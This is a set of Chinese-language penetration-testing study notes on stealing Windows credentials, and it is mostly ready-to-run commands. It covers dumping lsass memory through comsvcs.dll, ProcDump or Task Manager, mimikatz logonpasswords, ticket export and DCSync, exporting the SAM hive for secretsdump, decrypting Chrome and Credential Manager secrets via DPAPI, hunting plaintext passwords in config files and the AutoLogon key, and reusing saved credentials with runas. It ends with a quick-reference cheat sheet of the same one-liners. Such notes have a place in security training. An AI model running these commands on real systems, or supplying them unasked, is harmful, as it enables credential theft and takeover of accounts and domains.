## 學習目標

- 理解 Windows 各種憑證儲存位置（lsass / SAM / DPAPI / credential files）。
- 能用不同方式取得憑證（dump lsass / SAM / 瀏覽器 / Credential Manager）。
- 知道 mimikatz 的核心指令和對應的 Linux 替代方案。
- 知道在沒有高權限時如何找明文憑證。

---

## 理論基礎：Windows 憑證儲存體系

| 儲存位置 | 內容 | 需要什麼權限 |
|---------|------|------------|
| lsass.exe | 已登入使用者的 NT hash、Kerberos ticket、明文（舊版/WDigest） | SeDebugPrivilege 或 Local Admin |
| SAM hive | 本機帳號的 NT hash | SYSTEM |
| NTDS.DIT | 域所有帳號的 NT hash（DC 上）| Domain Admin |
| DPAPI | 使用者加密保護的資料（瀏覽器密碼、WiFi、Credential Manager）| 使用者帳號 |
| Credential Manager | 已儲存的網路憑證（RDP、網路分享）| 使用者帳號 |
| Registry | AutoLogon 明文密碼 | 低權使用者可讀 |
| 設定檔 | unattend.xml、web.config、.rdp 等 | 低權使用者可讀 |

## 方法一：dump lsass（最高回報）

```cmd
:: 方法 A：comsvcs.dll（無需額外工具）
:: 先找 lsass PID
tasklist | findstr lsass
:: 或
wmic process where name="lsass.exe" get ProcessId

:: dump（以管理員 cmd 執行）
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 660 C:\Temp\lsass.dmp full
:: 660 → 替換成實際的 lsass PID
:: C:\Temp\lsass.dmp → 輸出位置（確認目錄可寫）
:: full → 完整 dump

:: 方法 B：ProcDump（SysInternals）
.\procdump.exe -ma lsass.exe C:\Temp\lsass.dmp
:: -ma → Full dump（all memory）
:: 需要管理員權限

:: 方法 C：Task Manager（GUI）
:: 右鍵 lsass.exe → Create Dump File
:: 存到 %TEMP% 目錄

:: 傳回 Kali 分析
:: （上傳 dump 後）
pypykatz lsa minidump lsass.dmp
:: 輸出：
:: NT hash → 用於 PTH
:: Kerberos tickets → 用於 PTT
:: 明文密碼（若 WDigest 啟用）

:: 在 Kali 用 impacket 分析
python3 secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL
```

## 方法二：mimikatz（Windows 上直接執行）

```cmd
:: 在管理員 cmd / PowerShell 中執行
.\mimikatz.exe

:: 必做：取得 debug 權限
privilege::debug
:: 輸出 Privilege '20' OK → 成功

:: dump lsass（最常用）
sekurlsa::logonpasswords
:: 輸出所有已登入使用者的：
:: Username / Domain / NTLM hash / SHA1 / Kerberos ticket

:: 只看 NTLM hash（輸出乾淨一點）
sekurlsa::msv

:: 取出記憶體中的 Kerberos tickets
sekurlsa::tickets /export
:: /export → 把 ticket 存成 .kirbi 檔案
:: 之後可以 kerberos::ptt ticket.kirbi

:: dump SAM（本機帳號）
token::elevate       :: 提升到 SYSTEM token
lsadump::sam         :: dump SAM

:: DCSync（從 DC dump 任何帳號，需要 DA 或 DCSync 權限）
lsadump::dcsync /user:Administrator /domain:DOMAIN.LOCAL
:: /user   → 指定要 dump 的使用者
:: /domain → 目標 domain

:: 不互動式（一行執行後退出）
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > /tmp/creds.txt
```

## 方法三：SAM / SYSTEM dump

```cmd
:: 需要 SYSTEM 或 SeBackupPrivilege

:: 用 reg 指令匯出
reg save HKLM\SAM C:\Temp\SAM /y
reg save HKLM\SYSTEM C:\Temp\SYSTEM /y
reg save HKLM\SECURITY C:\Temp\SECURITY /y
:: /y → 強制覆蓋（不提示）

:: 傳回 Kali 解密
python3 secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
:: LOCAL → 本地檔案模式（不連線）
:: 輸出：本機帳號的 NT hash

:: 更快：直接 remotely（已有管理員帳號時）
python3 secretsdump.py DOMAIN/Administrator:PASSWORD@TARGET_IP
:: 不加 -just-dc → dump SAM + LSA secrets
:: 加 -just-dc → 只做 DCSync（DC 上）
```

## 方法四：DPAPI 解密（瀏覽器密碼 / Credential Manager）

```powershell
# DPAPI 保護的資料用當前使用者的 master key 加密
# 只能在那個使用者的 session 中解密（或取得 master key 後在其他地方解）

# 工具：SharpDPAPI（C#），用來解密 DPAPI 保護的資料
.\SharpDPAPI.exe credentials
# 解密 Windows Credential Manager 中的憑證

.\SharpDPAPI.exe logins
# 解密瀏覽器儲存的密碼

# 用 mimikatz dump DPAPI master key（需要管理員）
mimikatz.exe "privilege::debug" "dpapi::cache" "dpapi::chrome /unprotect" "exit"
# dpapi::chrome → 解密 Chrome 儲存的密碼

# PowerShell 版（Invoke-DCOMObjectQuery 或 Get-DecryptedCredential）
# 或直接讀瀏覽器資料庫（SQLite）
$db = "C:\Users\USERNAME\AppData\Local\Google\Chrome\User Data\Default\Login Data"
# 需要用 DPAPI 解密 password 欄位
```

## 方法五：找明文密碼（不需要高權限）

```powershell
# 搜尋常見設定檔
Get-ChildItem C:\ -Recurse -Include "*.xml","*.ini","*.txt","*.config","*.bat","*.ps1" `
  -ErrorAction SilentlyContinue | Select-String -Pattern "password|passwd|pwd" -SimpleMatch |
  Select-Object Path, LineNumber, Line

# 重點找的位置
$paths = @(
  "C:\Windows\Panther\unattend.xml",          # Windows 無人安裝 → 常有明文密碼
  "C:\Windows\System32\sysprep\sysprep.xml",  # Sysprep → 同上
  "C:\inetpub\wwwroot\web.config",            # IIS → 資料庫連接字串
  "$env:USERPROFILE\.rdg",                    # RDG 檔案（Remote Desktop 連線）
  "C:\Program Files\*\*.conf"                 # 各種程式設定檔
)
$paths | ForEach-Object { if (Test-Path $_) { Get-Content $_ | Select-String "pass" } }

# Windows Credential Manager（不需要管理員，只能看自己的）
cmdkey /list
# 找 Target: 後面的主機名和帳號
# 密碼本身不直接顯示，但可以：

# 用 runas 利用已儲存的憑證
runas /savecred /user:DOMAIN\USERNAME cmd.exe
# /savecred → 使用 Credential Manager 中儲存的密碼（不需要輸入密碼）
```

## 速查表

```cmd
:: dump lsass（無工具）
tasklist | findstr lsass
rundll32.exe comsvcs.dll MiniDump PID C:\Temp\lsass.dmp full
:: Kali: pypykatz lsa minidump lsass.dmp

:: mimikatz 一行
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

:: dump SAM
reg save HKLM\SAM C:\Temp\SAM && reg save HKLM\SYSTEM C:\Temp\SYSTEM
:: Kali: python3 secretsdump.py -sam SAM -system SYSTEM LOCAL

:: 找明文密碼（設定檔）
findstr /si /m "password" C:\*.xml C:\*.ini C:\*.config C:\*.txt

:: 找 AutoLogon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

:: Windows Credential Manager
cmdkey /list
runas /savecred /user:DOMAIN\USER cmd.exe
```
